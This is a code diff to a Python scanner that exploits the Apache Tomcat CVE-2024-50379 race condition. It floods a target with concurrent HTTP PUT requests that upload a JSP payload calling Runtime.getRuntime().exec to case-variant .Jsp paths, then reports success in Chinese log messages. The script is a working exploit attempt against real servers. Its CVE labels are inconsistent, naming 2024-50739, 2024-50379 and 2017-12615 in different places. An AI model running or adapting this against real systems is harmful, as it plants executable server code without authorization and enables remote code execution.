@@ -1,8 +1,7 @@
 import concurrent.futures
 import logging
 import ssl
-from urllib.parse import urljoin
-from urllib.parse import urlparse
+from urllib.parse import urljoin, urlparse
 from colorama import Fore, Style
 
 import requests
@@ -29,7 +28,7 @@ def check_cve_2024_50739(url, config):
 
     for protocol in protocols:
         target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
-        logging.info(f"{Fore.GREEN}Checking {target_url}...")
+        logging.info(f"{Fore.GREEN}[+] 检查 {target_url}...")
 
         target_url_put1 = urljoin(target_url, "/aa.Jsp")
         target_url_put2 = urljoin(target_url, "/bb.Jsp")
@@ -47,9 +46,9 @@ def check_cve_2024_50739(url, config):
         payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
 
         # 增加线程
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10000) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
             futures = []
-            # 循环执行10000次
+            # 循环执行100次
             for _ in range(100):
                 futures.append(
                     executor.submit(requests.put, target_url_put1, verify=False, headers=headers1, data=payload_put))
@@ -61,17 +60,16 @@ def check_cve_2024_50739(url, config):
             for future in concurrent.futures.as_completed(futures):
                 try:
                     response = future.result()
-                    # logging.info(f"Response status: {response.status_code}")
                     if isinstance(response, requests.Response):
-                        if (response.status_code == 201) or (response.status_code == 200):
-                            found_vulnerabilities = True
-                            # logging.info(f"Response status: {response.status_code}")
+                        if response.status_code in [200, 201]:
+                            logger.info(
+                                f"{Fore.GREEN}[+] 成功: Apache Tomcat CVE-2024-50379  漏洞利用方式:{target_url}aa.JSP OR {target_url}bb.Jsp")
+                            return True, "CVE-2024-50379", None
+                except requests.exceptions.RequestException as req_ex:
+                    logger.warning(f"{Fore.RED}[-] 请求失败: {req_ex}")
                 except Exception as e:
-                    logging.info(f"Error occurred: {e}")
-
-            if found_vulnerabilities:
-                logging.info(
-                    f"{Fore.GREEN}Find: {url}: Apache Tomcat CVE-2024-50379 Conditional Competition To RCE!")
-                return True, None, None
+                    logger.error(f"{Fore.RED}[-] 发生未知错误: {e}")
+                    logger.warning(f"{Fore.RED}[-] 失败: CVE-2017-12615 漏洞 Not Found")
 
             return False, None, None
+
